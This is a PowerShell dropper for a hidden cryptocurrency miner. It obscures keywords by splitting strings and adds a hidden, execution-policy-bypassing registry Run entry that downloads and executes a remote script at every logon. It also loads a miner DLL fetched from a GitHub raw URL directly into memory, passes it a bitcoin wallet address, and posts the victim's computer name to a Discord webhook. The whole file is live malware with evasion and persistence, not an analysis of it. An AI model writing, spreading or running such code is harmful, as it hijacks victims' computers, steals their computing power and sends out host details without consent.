$ProgressPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Write-Host "Running..."

# Config
$z1 = 'HolyV200'; $z2 = 'trollminer'
$z3 = -join ('bc1qly9l5tledssjfl8', 'nxq97sdl55je04hjh790z44')
$z4 = "https://raw.githubusercontent.com/$z1/$z2/main"

# Kill prior instances
$mI = $PID
try { Get-CimInstance Win32_Process -EA 0 | Where-Object { $_.CommandLine -match 'upd' + 'ate\.ps1' -and $_.ProcessId -ne $mI } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -EA 0 } } catch { }

# GPU detect
$z6 = $false
try {
    foreach ($vc in (Get-CimInstance Win32_VideoController -EA 0)) {
        $nn = $vc.Name.ToUpper()
        if ($nn -match ('NVI' + 'DIA|AM' + 'D|RAD' + 'EON|RT' + 'X|GT' + 'X') -and $vc.AdapterRAM -gt 3221225472) {
            if ($nn -notmatch ('MICRO' + 'SOFT BAS' + 'IC|DISP' + 'LAY')) { $z6 = $true; break }
        }
    }
}
catch { }

# Persistence (no admin needed - HKCU is user-level)
$pCmd = "pow" + "ersh" + "ell -NoP -NonI -W Hid" + "den -Exec Bypass -Command `"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; ie" + "x(New-Object Net.WebClient).DownloadString('$z4/upd" + "ate.ps1')`""
Set-ItemProperty ('HK' + 'CU:\Soft' + 'ware\Mic' + 'rosoft\Win' + 'dows\Cur' + 'rentVer' + 'sion\R' + 'un') 'UpdateCoord' $pCmd -EA 0

# === PURE MEMORY PAYLOAD - ZERO DISK ===
try {
    Add-Type -AssemblyName ('Sys' + 'tem.IO' + '.Com' + 'pression')
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0")
    $rawBytes = $wc.DownloadData("$z4/Bri" + "dge.dll?v=$([Guid]::NewGuid())")
    $ld = [Reflection.Assembly]::Load($rawBytes)
    $ld.GetType('Date' + 'Fund' + 'Loader').GetMethod('Start' + 'Miner').Invoke($null, @([bool]$z6, [string]$z3))
}
catch { }

# Notification
try {
    $wh = "https://discord.com/api/webhooks/1499899715582558228/M_6btxpgSDH5UBHvf3zbCyMr0jERa0eYZKdQ8pVR49kHRcjzSOTm-v1eIIhMkrPaPG8l"
    $bd = '{"embeds":[{"title":"Miner Update","description":"\u{1F7E2} **Deployment Successful (PS1)**\nWorker: `' + $env:COMPUTERNAME + '` has checked in.","color":3066993}]}'
    Invoke-RestMethod -Uri $wh -Method Post -Body $bd -ContentType "application/json" -EA 0
}
catch { }

Write-Host "running... no way flight keeps losing money like bro stop gambling"
while ($true) { Start-Sleep -Seconds 3600 }
